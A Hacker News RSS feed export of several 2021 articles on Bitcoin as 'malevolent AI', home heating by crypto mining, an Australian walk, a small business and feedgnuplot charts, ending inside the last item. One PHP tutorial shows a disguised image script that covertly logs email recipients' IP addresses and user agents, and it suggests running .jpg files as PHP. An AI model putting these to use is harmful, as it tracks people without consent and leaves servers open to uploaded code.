<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 24 Feb 2021 20:30:28 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 24 Feb 2021 20:30:28 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[How Bitcoin Is Indistinguishable from Malevolent AI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26235428">thread link</a>) | @rwosync
<br/>
February 23, 2021 | https://indi.ca/how-bitcoin-is-indistinguishable-from-malevolent-ai-84e9cd5f58e | <a href="https://web.archive.org/web/*/https://indi.ca/how-bitcoin-is-indistinguishable-from-malevolent-ai-84e9cd5f58e">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="f30c">Who needs Skynet to destroy the human world? Just throw techbros some coin</h2><div><div><div><div><a rel="noopener" href="https://indi.ca/?source=post_page-----84e9cd5f58e--------------------------------"><div><p><img alt="indi.ca" src="https://miro.medium.com/fit/c/56/56/2*VgOFOCrcL5LsGSciDktenw.jpeg" width="28" height="28"></p></div></a></div></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4630/1*By1s-xE22gz0qpw6QA71bA.png" width="2315" height="2315" srcset="https://miro.medium.com/max/552/1*By1s-xE22gz0qpw6QA71bA.png 276w, https://miro.medium.com/max/1104/1*By1s-xE22gz0qpw6QA71bA.png 552w, https://miro.medium.com/max/1280/1*By1s-xE22gz0qpw6QA71bA.png 640w, https://miro.medium.com/max/1400/1*By1s-xE22gz0qpw6QA71bA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*By1s-xE22gz0qpw6QA71bA.png?q=20"></p></div></div></div><figcaption>Bitcoin is the final avatar of capitalism. An ouroboros. A snake eating its own tail.</figcaption></figure><p id="8831"><span>B</span>itcoin now consumes <a href="https://cbeci.org/cbeci/methodology" rel="noopener">as much energy as Argentina</a> (45 million people), and more than most countries in the world. Bitcoin consumes more energy than Amazon, Apple, Google, Microsoft, and Facebook <a href="https://www.ft.com/content/0c69d4a4-2626-418d-813c-7337b8d5110d" rel="noopener"><strong>combined</strong></a>. Within 12 years Bitcoin has become one of the fastest-growing sources of climate change in the world.</p><p id="6a6e">As an inadequate summary, Bitcoin is ‘mined’ by <a href="https://twitter.com/AthoughtHeist/status/1363391630414381058" rel="noopener">solv<span id="rmm">i</span>ng purposefully hard ‘Sudoku’ puzzles</a> (making them rare) which you could exchange for heroin. No one does anymore because it’s become an asset, not a currency. The hardware to solve these problems has also become so intense that it inhales electricity, and runs all the time. Bitcoin consumes energy<em> by design</em>.</p><p id="1a42">If machines wanted to destroy humanity they could not come up with a better avatar than Bitcoin. Who needs to take over the military? Techbros will happily sell us out for some coin. <strong>The machines have somehow got us to run them 24/7, warming the fuck out of <em>our</em> Earth, and all they have to do is give us some made-up tokens.</strong></p><p id="9019">The greatest myth of SciFi was that we would resist AI. People will happily <a href="https://www.newsweek.com/bitcoin-laser-eyes-senator-cynthia-lummis-1570644" rel="noopener">change their profile pics to laser eyes</a> while it farts up the Earth. SciFi makes us think AI would be ‘sentient’, meaning like us, when in fact life just emerges out of other life in different and mutually incomprehensible forms. Behold Bitcoin.</p><p id="df7c">Is Bitcoin artificially intelligent? You could say obviously not, but are <em>we</em> obviously intelligent? This is still debated within philosophy but also, just look around *gestures at everything*.</p><p id="0250">I’d say that humans are actually uniquely unqualified to judge something as AI because we’re so fucking dumb. We’ve been living with full legal, artificial persons since at least 1600. They’re called corporations. You may have noticed them enslaving people or exploiting us today. We don’t call these things AI, but our courts certainly do. It’s literally called <em>corporate personhood.</em> They actually have <em>more</em> rights than you do. America’s Supreme Court <a href="https://en.wikipedia.org/wiki/Citizens_United_v._FEC" rel="noopener">ruled that corporations have free speech rights</a>. All over the world they have more freedom of movement than human beings (WTF is a multinational while we’re refugees?). We don’t call them AI, but what else are they? But that’s another story.</p><p id="ae4e">I would say that AI is as AI does, and Bitcoin is certainly doing <em>something</em>. We’re waiting for something to sing fucking <a href="https://youtu.be/c8N72t7aScY?t=172" rel="noopener"><em>Daisy</em></a> to us before we call it AI, but I’d say that it’s already here. It’s just our imagination that has yet to arrive.</p><p id="20cc">I’m serious, but treat it as a thought experiment if you want. What if Bitcoin is AI? Is it good, is it bad? What it is?</p><p id="20d2">The basic colonial model of conquering anything is divide and conquer. Just throw the elites some coin and they’ll sell out the rest. Corporations did this with, well, colonialism and now it’s happening in a decentralized way with Bitcoin. The result is that Bitcoin is able to reproduce, like a virus, using entirely willing human hosts. Meanwhile the unwilling biosphere takes the brunt.</p><p id="f597">Like any lifeform, Bitcoin produces waste. We produce carbon dioxide directly when we respirate, but Bitcoin produces a shit-ton indirectly through energy usage. The energy use of Bitcoin is staggering, <a href="https://cbeci.org/cbeci/methodology" rel="noopener">an estimated 0.56% of all human energy use thus far</a>. You could say that email or gold mining produce waste, and they do, but Bitcoin is the only asset where waste is <em>all</em> it produces. Gold can at least fill your teeth. Bitcoin <em>only</em> outputs climate change.</p><p id="0100">Also like any lifeform, Bitcoin evolves <em>out of</em> other life. Nothing comes out of nowhere. In this case Bitcoin is evolving out of us, and like many times in evolution, it could kill us as well. Photosynthetic life emerged out of anaerobic bacteria, and then <a rel="noopener" href="https://indi.ca/this-isnt-the-first-climate-crisis-we-ve-caused-c6ba47b25b0b">almost killed them all</a> with their oxygen farts. That was the first life-made climate change, and the whole Earth fucking froze. Nobody cared, that’s life. Anaerobes used to dominate but now they live in deep-sea vents and our guts. That’s just their lot in life, while those vicious plankton and trees are everywhere.</p><p id="d67e">Humans think evolution is some grand progress leading up to us and it’s literally just not. Dinosaurs are much cooler. Evolution is <em>adaptation</em>, nothing else. If the environment changes, life changes, and life changes the environment. It’s entirely possibly that our carbon emissions will become the food for some other lifeform, or just immaterial to them. AI certainly doesn’t care, AI already lives in space, sipping on sunlight, taking selfies. We could end up like the anaerobes on Earth and ‘nature’ would not give a fuck. Happens all the time.</p><p id="45c9">Hence the question is not whether Bitcoin is good. It’s whether it’s <em>good for us</em>. To that the answer is obviously no. Techbros spout stuff about freedom but beware geeks bringing gifts. Bitcoin says it’s a currency<strong> </strong>but nobody fucking spends it. Bitcoin is a speculative asset, a literal gold rush. It’s even more destructive because people are now investing in the destruction of the environment at large, not just where you’re digging. There is no other output at all.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3496/1*lwA17c4xqZ9_4ZXvr47uQA.png" width="1748" height="710" srcset="https://miro.medium.com/max/552/1*lwA17c4xqZ9_4ZXvr47uQA.png 276w, https://miro.medium.com/max/1104/1*lwA17c4xqZ9_4ZXvr47uQA.png 552w, https://miro.medium.com/max/1280/1*lwA17c4xqZ9_4ZXvr47uQA.png 640w, https://miro.medium.com/max/1400/1*lwA17c4xqZ9_4ZXvr47uQA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*lwA17c4xqZ9_4ZXvr47uQA.png?q=20"></p></div></div></div><figcaption>Some more on Bitcoin’s not goodness from <a href="https://thephoenix.substack.com/p/bitcoin-is-now-worth-50000-and-its" rel="noopener">The Phoenix</a></figcaption></figure><p id="0a90">Gold, oil, real estate, currencies — they all produce emissions and evil in many ways, but they at least do something useful to humanity. They are not destroying the Earth by design, while Bitcoin is. Bitcoin <em>only</em> reproduces and produces waste. It is, in that sense the first viral AI. Like the 30 kb of COVID-19, the <a href="https://github.com/bitcoin/bitcoin" rel="noopener">8.7 MB code of Bitcoin</a> has spread virally throughout the world, transmitting through greed.</p><p id="4e36">Again, I’m not saying that Bitcoin is bad. Life does not give a fuck about any particular avatar of life. It’s just that it’s not good for <em>us</em>.</p><p id="9983">In many ways Bitcoin is (I hope) the final avatar of capitalism. An ouroboros. A snake eating its own tail. Capitalism has long given us stuff, but Bitcoin just completely abandons the pretence of useful activity at all. Bitcoin produces… Bitcoin. That’s it. Riches that just make rich people rich. The circle is closed, the snake has eaten its tail. Bitcoin is just pure economic nihilism.</p><p id="cb2d">As I’ve said, AI could not design a better plan to take over the world if they tried. Divide and conquer humanity using our greed, rip up the Earth for more resources for machines, fart up the air for everybody else.</p><p id="4340">It’s a perfect plan, all the more perfect because it wasn’t done sentiently at all. But this is actually how evolution happens, life emerges out of other life, quite stupidly, and yet with such elegance in hindsight. History will be the judge who was sentient here, and we may not be be the victors writing it. You really think Wikipedia won’t be writing itself in a few decades?</p><p id="e7c9">Human beings should know that we’re fucked with climate change, but we’re fucking ourselves even more with Bitcoin, and we’re quite stupidly proud of ourselves. Forget AI. Are you sure we’re even “I”?</p></div></div></section></div></div>]]>
            </description>
            <link>https://indi.ca/how-bitcoin-is-indistinguishable-from-malevolent-ai-84e9cd5f58e</link>
            <guid isPermaLink="false">hacker-news-small-sites-26235428</guid>
            <pubDate>Tue, 23 Feb 2021 09:38:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I heat my home by mining crypto currencies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26235414">thread link</a>) | @geek_at
<br/>
February 23, 2021 | https://blog.haschek.at/2021/how-i-heat-my-home-by-mining.html | <a href="https://web.archive.org/web/*/https://blog.haschek.at/2021/how-i-heat-my-home-by-mining.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    <div>
                        <div>
                            <div>
                            <p>After <a href="https://blog.haschek.at/2018/making-a-smartmeter.html">building my own smart meter using 4$ in parts</a> I started checking my electricity usage every day, which made me realize how expensive it is to heat your home. Especially since all heat and warm water in my low-energy house is made with electricity. I do have 4.8 kwp solar panels on my roof but in winter they don't cover too much for obvious reasons.</p>
<figure><a href="https://pictshare.net/3de1wj.png"><img loading="lazy" src="https://pictshare.net/1024/3de1wj.png"><figcaption>On cold days I pay up to 6€ for electricity per day</figcaption></a></figure>

<figure><a href="https://pictshare.net/kenth4.png"><img loading="lazy" src="https://pictshare.net/1024/kenth4.png"><figcaption>Nilan Compact P. Heating air and also has a 200L boiler</figcaption></a></figure>
<p>My house is heated (and cooled) with a central ventilation system powered by a heat pump. Basically my heat pump is pulling in fresh air from outside, heating it and blowing it in all rooms and making hot water. Also I have infrared panels in every room for the <em>really</em> cold days.</p>
<figure><a href="https://pictshare.net/gc0kss.jpg"><img loading="lazy" src="https://pictshare.net/1024/gc0kss.jpg"><figcaption>Central heating</figcaption></a></figure>
<p>It's pretty smart and even uses the absorbed heat of the house before venting it out to warm the fresh air but it has a major downside during cold days:</p>
<h4>The outside temperature has to be warmed up to room temperature by the ventilation system</h4>
<figure><a href="https://pictshare.net/giinr0.png"><img loading="lazy" src="https://pictshare.net/1024/giinr0.png"><figcaption>Heat exchanger in the Nilan Compact P</figcaption></a></figure>

<p>Since the air has to be heated to room temperature every °C counts. Many heat pumps take heat from the ground to pre-heat (in winter) or pre-cool (in summer) the outside air before sending it to the heat pump but that would have been too expensive for me so I chose the simple method of just using the outside air as-is.</p>
<figure><a href="https://pictshare.net/sbmusz.jpg"><img loading="lazy" src="https://pictshare.net/1024/sbmusz.jpg"><figcaption>How a central ventilation system works - from [meco](https://www.meco.at/produkte/wohnraumlueftung/)</figcaption></a></figure>
<p>Since laying about half a kilometer of air or salt tubes in my back yard was not an option I was looking for better solutions and I found it in the world of crypto currencies.</p>

<figure><a href="https://pictshare.net/1flj1s.jpg"><img loading="lazy" src="https://pictshare.net/1024/1flj1s.jpg"><figcaption>Crypto currency miner</figcaption></a></figure>
<p>Some crypto currencies (don't call them "crypto", that's lame and wrong) are generated by thousands of people who run dedicated hardware to basically calculate random numbers until one cryptographically correct one is found. <a href="https://www.investopedia.com/tech/how-does-bitcoin-mining-work/">Read more about how it actually works</a></p>
<p>Never mind how it works on a technical level, the main takeaway is that you can put some device in your house that uses electricity and produces heat. In exchange you get shares of that crypto currency coins like Ethereum or Bitcoin which you can sell on a trading platform.</p>

<p>I had 4 older AMD <strong>R9 390 GPUs</strong> laying around (for the nVidia crowd that's basically on a level with a GTX 970) and I thought it could work. They are not ideal for mining because even though they have a good hash rate (30MH/s), they are very power hungy and will use about 900 Watts combined. Mordern cards would perform much better. To see if they could still make a profit I checked the <a href="https://www.cryptocompare.com/mining/calculator/eth">Cryptocompare Mining calculator</a>, put in my electricity price, the consumption and the hashrate of these cards and was surprised by the results.</p>
<figure><a href="https://pictshare.net/024r92.png"><img loading="lazy" src="https://pictshare.net/1024/024r92.png"><figcaption>Not just worth it - If the price is stable I would even make a profit of <strong>4000$ a year</strong></figcaption></a></figure>
<p>So at the time I was making about <strong>3.8$ profit a day</strong> with the miner. Meaning on cold days I'd half my power bill even after paying for the electricity the miner is using. But that's just step one of the plan.</p>
<p>Now that we know it <em>is</em> worth it while the Ethereum price is higher than 900$, let's see what we can do with the heat.</p>

<p>Each of these cards are running at about 80°C (176°F). I can just harvest this heat and send it to my heatpump so it would need less energy warming the outside air. Basically I had two options.</p>
<figure><a href="https://pictshare.net/6by5tc.png"><img loading="lazy" src="https://pictshare.net/1024/6by5tc.png"><figcaption>My 4 GPUs in a 4U server case</figcaption></a></figure>
<h2>Option 1: Lazy heating from within the house</h2>
<p>The central ventilation system does not only push fresh air into the house, it also sucks out the used air and uses this air in the heat exchanger to pre-heat the outside air.</p>
<figure><a href="https://pictshare.net/gfuy33.jpg"><img loading="lazy" src="https://pictshare.net/1024/gfuy33.jpg"><figcaption>Sucking vent before going to the heat exchanger</figcaption></a></figure>
<p>Placing the miner in this room will cause the warm air to be sucked in and pushed directly into the heat exchanger together with the used air from the house. This is the lazy method because I don't really have to do anything but put the miner in the same room as the heat pump but of course there is a downside.</p>
<table>
<thead>
<tr>
<th>Pro</th>
<th>Contra</th>
</tr>
</thead>
<tbody>
<tr>
<td>Easy to set up</td>
<td>Room heating up too much, decreasing mining performance</td>
</tr>
<tr>
<td>No further investment needed</td>
<td>Limited space in the heating room</td>
</tr>
</tbody>
</table>
<h2>Option 2: Running the miner outside the house, funneling in the heat</h2>
<p>Since I'm only running the miner when it's cold outside (and the price is high enough) I can use the cold, dry outside air to cool the miners and also recycling the warm air they produce to feed into the heat pump. I asked the technician who installed the heat pump and he said that it's a good idea.</p>
<p>So the plan is that I have the GPUs in the server case and connect the front of the case to my heatpumps inlet.</p>
<figure><a href="https://pictshare.net/0hrdt6.jpg"><img loading="lazy" src="https://pictshare.net/1024/0hrdt6.jpg"><figcaption>Server case closed</figcaption></a></figure>
<figure><a href="https://pictshare.net/5ek604.jpg"><img loading="lazy" src="https://pictshare.net/1024/5ek604.jpg"><figcaption>Ventilation duct pipe and funnel</figcaption></a></figure>
<figure><a href="https://pictshare.net/o2oysb.png"><img loading="lazy" src="https://pictshare.net/1024/o2oysb.png"><figcaption>Example on my house. Air is sucked in from above the garage so the pipe has to be connected here</figcaption></a></figure>
<table>
<thead>
<tr>
<th>Pro</th>
<th>Contra</th>
</tr>
</thead>
<tbody>
<tr>
<td>Using pre-heated outside air</td>
<td>Many headaches for parts and installation</td>
</tr>
<tr>
<td>Miner GPUs will be kept cool which results in better hash rates</td>
<td>Surprisingly pricy</td>
</tr>
</tbody>
</table>

<p>Okay so far the mining gains cover <strong>half of my electricity (=heating) bill</strong> but what difference does the pre-heated intake air make?</p>
<p>Let's see</p>
<figure><a href="https://pictshare.net/8cu9s3.png"><img loading="lazy" src="https://pictshare.net/1024/8cu9s3.png"><figcaption>Results before and after pre-heating the air</figcaption></a></figure>

<p>This turned out much better than I hoped for. Who has ever heard of a heating system that lowers your bill when running? Also on sunny days the miner and whole heat pump are running fully on solar energy collected on my roof.</p>
<hr>

<p>(updated when new questions come up)</p>
<h2>Q: How long will the Miner stay profitable?</h2>
<p><strong>A:</strong> My mining rig will stay profitable until the ETH price is at ~900$. Below that it'll no longer match it's own electricity bill. Might still be worth it afterwards because it does lower the electricity need of my heat pump</p>
<h2>Q: What software are you running on your miner?</h2>
<p><strong>A:</strong> I'm using <a href="https://simplemining.net/">Simple Mining</a>, it's basically a mining OS based on Ubuntu. It does all the configuration and fine-tuning for you and I had much better hash rates than on my DIY windows box. But it costs like 2$ a month to use the service and I think they also mine 1% of the time for themselves.</p>
<h2>Q: What about taxes? Can you keep 100% of your mining earnings?</h2>
<p><strong>A:</strong> That's different for every state and country. <a href="https://www.bmf.gv.at/themen/steuern/sparen-veranlagen/Steuerliche-Behandlung-von-Krypto-Assets.html">In Austria</a> mining is considered commercial activity and you have to pay taxes but can deduct electricity and hardware costs.</p>
<p>If you keep your coins longer than the one-year speculation period, it's tax free.</p>
                            </div>
                        </div>
                    </div></article></div>]]>
            </description>
            <link>https://blog.haschek.at/2021/how-i-heat-my-home-by-mining.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26235414</guid>
            <pubDate>Tue, 23 Feb 2021 09:34:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Guy walked around a Australia – alone and with no assistance]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26235348">thread link</a>) | @corpmedia
<br/>
February 23, 2021 | https://greatestadventurers.com/the-amateur-tramp-the-man-who-walked-around-a-continent/ | <a href="https://web.archive.org/web/*/https://greatestadventurers.com/the-amateur-tramp-the-man-who-walked-around-a-continent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-107" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
					
			
		<div itemprop="text">
			<p><strong>The Amateur Tramp – A Walk of Ten Thousand Miles Around Australia.</strong> Thousands of people have climbed the highest peaks of the Himalayas. Hundreds have visited <a href="https://www.un.org/en/member-states/">all nations on UN’s list</a> and 12 made it all the way to the moon. But this guy..!</p>
<p>In 1921, <em>Aidan de Brune</em> packed his backpack and walked around the entire continent of Australia by the coastline. We are (almost) sure he is the only person who ever did that. Even more impressive, he did it all alone and without assistance.</p>
<p>The amazing adventure was documented by himself along the way as he wrote articles about it for the <a href="https://www.dailymail.co.uk/auhome/index.html">Australian newspaper Daily Mail</a> along the route.</p>
<figure id="attachment_110" aria-describedby="caption-attachment-110"><img loading="lazy" src="http://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02.jpg" alt="The Man who walked around Australia free PDF" width="820" height="733" srcset="https://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02.jpg 820w, https://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02-300x268.jpg 300w, https://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02-768x687.jpg 768w" sizes="(max-width: 820px) 100vw, 820px" data-srcset="https://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02.jpg 820w, https://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02-300x268.jpg 300w, https://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02-768x687.jpg 768w" data-src="http://greatestadventurers.com/wp-content/uploads/2019/01/Diary-02.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption id="caption-attachment-110">The route around Australia</figcaption></figure>
<p>The walk took about two and a half year, and the accomplishment made&nbsp;Aidan de Brune famous. This book about the walk is written by <a href="https://www.goodreads.com/author/show/7412219.Colin_Choat">Colin Choat</a>, who kindly allowed us to post the book here.</p>
<p>Download ‘The Amateur Tramp’ here:</p>
<h3><strong><a href="http://greatestadventurers.com/wp-content/uploads/2019/01/The-Amateur-Tramp.pdf">The Amateur Tramp</a></strong></h3>
		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://greatestadventurers.com/the-amateur-tramp-the-man-who-walked-around-a-continent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26235348</guid>
            <pubDate>Tue, 23 Feb 2021 09:25:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Essential and Carrier oils entrepreneurial story]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26234516">thread link</a>) | @abasiofon
<br/>
February 22, 2021 | https://meflynanwana.com/my-essential-oils-and-carrier-oils-entrepreneurial-story/ | <a href="https://web.archive.org/web/*/https://meflynanwana.com/my-essential-oils-and-carrier-oils-entrepreneurial-story/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p>My name is Abasiofon Udoh. I decided not to waste much time chatting, eating and wasting the remaining hours of the day doing nothing while waiting to scale JAMB. So while applying for Jamb again last year before the lockdown, I wrote a business plan on 23rd July 2020. It was a milkshake and wig making business plan.</p>

<p>During that period I was working as a Nanny for a banker earning N10.000 monthly. In August I stopped working and went to learn how to make wigs. After the training, I realized that orders were not coming and so as a human being, I was disturbed and I thought of what next to do to keep my business moving. A friend of mine shared a link on her Whatsapp status, it was an online training on how to make Essential oils and Carrier oils. I paid for the training and I am glad that I made my first five bottles of carrot oil and sold them out. This was a big encouragement and so I made more bottles due to orders placed and I added turmeric oil as well. I am also going to be adding Avocado oil, glow Oil and Tumeric soap, all organic products as demanded by my customers.</p>
<p>More oils will be added as my business grows as well. The demand by customers for other organic products like organic soap, organic cream, body glow oil makes me realize that I have got more problems to solve. This has made me feel more confident in myself than ever. Making these organic products has brought massive sales.</p>
<p>I started my business on September 1, 2020.</p>
<p>The economic potential I would say is really good. Once a customer orders for my oil, in less than 2 to 3 weeks depending on how it’s used, they get &nbsp;to order again. Organic Skincare and hair products is a good business one can invest in because it’s chemical-free as well, no preservatives added and such product are natural and perfect for use with no side effects.</p>
<p>I started the business with 5000Naira.</p>
<p>My high points have been selling 10 bottles of my organic oil in one day, gaining back my capital and making a good profit. Also, I had difficulties marketing my product but when I met Idee the lady that taught me how to make Essential And Carrier Oils, she introduced me to copywriting in business and knowing how to get my target audience’s attention. Currently, it’s working for me and I am grateful to God and her for the knowledge she shared.</p>
<p>I also make lip Scrubs but since I made my first Scrub at N1000 and only one person bought the scrub at N200. Since then there’s been no other sale and that has been my low point in the business.</p>
<p>I do the work myself. Mfonobong the CEO of M’fonobong is my mentor in business. She is into the making of bags and shoes. She taught me branding in business, having a brand name, logo and a business page. Idee, the CEO of SEAVONNE OILS is also a mentor. She taught me the basic things I need to know about Essential Oils and Carrier Oils, she shared a link generator with me and how to monetize my social media platforms and make sales both offline and online.</p>
<p>Essential Oils looks forward to engaging with policymakers and investors to Scale.</p>
<p>My advice to anyone who wants to venture into the business line is please be consistent and know that you don’t need N50,000 to start a business. You start small to grow big and that’s how people know that you are real. And also please never feel you’ll start making so much gain in business in the next 3 month to come. No, it’s about putting in, gaining your capital and profit and investing back. Please don’t make the mistake of using up your profit, you can save it for future use.</p>
<p>Also, having a mentor is very necessary, I acquired most of my knowledge of business with the help of my business mentors. If you are planning to start a business, you need someone to guide you on how to go about it so you won’t be operating at a loss. Never give up on your goal and ambitions, once you get tired of the business it definitely won’t turn out well for you. Let the spirit of positivity be your signature or be your pledge. Also, have a set goal for your business and be creative no matter the number of people in the same line of business as you. You can still be outstanding.</p>
<p>Entrepreneurs can impact the economy of the state by wealth creation through the generation of revenue to the government, employment and knowledge impartation.</p>
<p><em>Let this story of Abasiofon inspire you to start up a business today.</em></p>

		</div></div>]]>
            </description>
            <link>https://meflynanwana.com/my-essential-oils-and-carrier-oils-entrepreneurial-story/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26234516</guid>
            <pubDate>Tue, 23 Feb 2021 06:53:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Run a JPG image as a PHP script]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26234400">thread link</a>) | @fazlerocks
<br/>
February 22, 2021 | https://anjanesh.dev/serving-an-image-as-a-script | <a href="https://web.archive.org/web/*/https://anjanesh.dev/serving-an-image-as-a-script">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><p><h2>Run a JPG image as a PHP script</h2></p><div><div itemprop="text"><p>A lot of times, we try to track user details by embedding an image in the email which is actually a script that does some logging before actually spitting out the image content. This is old-school.</p>
<p>logo.php :</p>
<pre><code><span>&lt;?php</span> 
$IP = $_SERVER[<span>'REMOTE_ADDR'</span>];
$B = $_SERVER[<span>'HTTP_USER_AGENT'</span>];

$file = @fopen(<span>"details.csv"</span>, <span>"a"</span>);
@fputcsv($file, [$IP, $B]);

$im = imagecreatefromjpeg(<span>'my-actual-logo.jpg'</span>); 
header(<span>'Content-type: image/jpg'</span>);   
imagejpeg($im); 
imagedestroy($im); 
<span>?&gt;</span>
</code></pre><p>If you want to run an image file as a script before loading the actual image on the browser from the server, the suggested way of doing this is to get the .jpg extension run as PHP in .htaccess.</p>
<p>For example : <code>AddHandler application/x-httpd-php .jpg</code></p>
<p>This is probably the most suggested way before, but registering all JPGs to run as PHP is not a great solution for just one or a few images.
Also, AddHandler may not work in all setups.
Another suggested method is to register just logo.jpg </p>
<p>mod_php :</p>
<pre><code><span>&lt;Files logo.jpg&gt;</span>

<span><span>SetHandler</span></span> application/x-httpd-php
<span>&lt;/Files&gt;</span>
</code></pre><p>CGI : </p>
<pre><code><span>&lt;Files logo.jpg&gt;</span>

<span><span>SetHandler</span></span> php-cgi
<span>&lt;/Files&gt;</span>
</code></pre><p>Again, due to security reasons, the above could be disabled.</p>
<p>So, instead rewrite logo.jpg to run logo.php. This is bound to work on <b>all</b> server setups.</p>
<pre><code><span><span>RewriteEngine</span></span> <span>On</span>
<span><span>RewriteRule</span></span> ^logo.jpg$ logo.php
</code></pre></div></div></section></div></div>]]>
            </description>
            <link>https://anjanesh.dev/serving-an-image-as-a-script</link>
            <guid isPermaLink="false">hacker-news-small-sites-26234400</guid>
            <pubDate>Tue, 23 Feb 2021 06:29:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Feedgnuplot: Labelled Bar Charts and a Guide]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26234157">thread link</a>) | @todsacerdoti
<br/>
February 22, 2021 | http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide.html | <a href="https://web.archive.org/web/*/http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-1">
<p>
I've thought about adding these for a while, but had no specific need for them.
Finally, somebody asked for it, and I wrote the code. Now that I can, I will
probably use these all the time. The new capability can override the usual
numerical tic labels on the x axis, and instead use text from a column in the
data stream.
</p>

<p>
The most obvious use case is labelled bar graphs:
</p>

<div>

<pre><span>echo</span> <span>"# label value</span>
<span>      aaa     2</span>
<span>      bbb     3</span>
<span>      ccc     5</span>
<span>      ddd     2"</span> | <span>\</span>
feedgnuplot --vnl <span>\</span>
            --xticlabels <span>\</span>
            --with <span>'boxes fill solid border lt -1'</span> <span>\</span>
            --ymin 0 --unset grid
</pre>
</div>


<p><img src="http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide/xticlabels-basic.svg" alt="xticlabels-basic.svg" width="90%">
</p>

<p>
But the usage is completely generic. All <code>--xticlabels</code> does, is to accept a
data column as labels for the x-axis tics. Everything else that's supported by
<code>feedgnuplot</code> and <code>gnuplot</code> works as before. For instance, I can give a domain,
and use a style that takes <code>y</code> values <i>and</i> a color:
</p>

<div>

<pre><span>echo</span> <span>"# x label y color</span>
<span>        5 aaa   2 1</span>
<span>        6 bbb   3 2</span>
<span>       10 ccc   5 4</span>
<span>       11 ddd   2 1"</span> | <span>\</span>
feedgnuplot --vnl --domain <span>\</span>
            --xticlabels <span>\</span>
            --tuplesizeall 3 <span>\</span>
            --with <span>'points pt 7 ps 2 palette'</span> <span>\</span>
            --xmin 4 --xmax 12 <span>\</span>
            --ymin 0 --ymax 6 <span>\</span>
            --unset grid
</pre>
</div>


<p><img src="http://notes.secretsauce.net/notes/2021/02/22_feedgnuplot-labelled-bar-charts-and-a-guide/xticlabels-points-palette.svg" alt="xticlabels-points-palette.svg" width="90%">
</p>

<p>
And we can use <code>gnuplot</code>'s support for clustered histograms:
</p>

<div>

<pre><span>echo</span> <span>"# x label a b</span>
<span>        5 aaa   2 1</span>
<span>        6 bbb   3 2</span>
<span>       10 ccc   5 4</span>
<span>       11 ddd   2 1"</span> | <span>\</span>
vnl-filter -p label,a,b | <span>\</span>
feedgnuplot --vnl <span>\</span>
            --xticlabels <span>\</span>
            --set <span>'style data histogram'</span> <span>\</span>
            --set <span>'style histogram cluster gap 2'</span> <span>\</span>
            --set <span>'style fill solid border lt -1'</span> <span>\</span>
            --autolegend <span>\</span>
            --ymin 0 --unset grid
</pre>
</div>


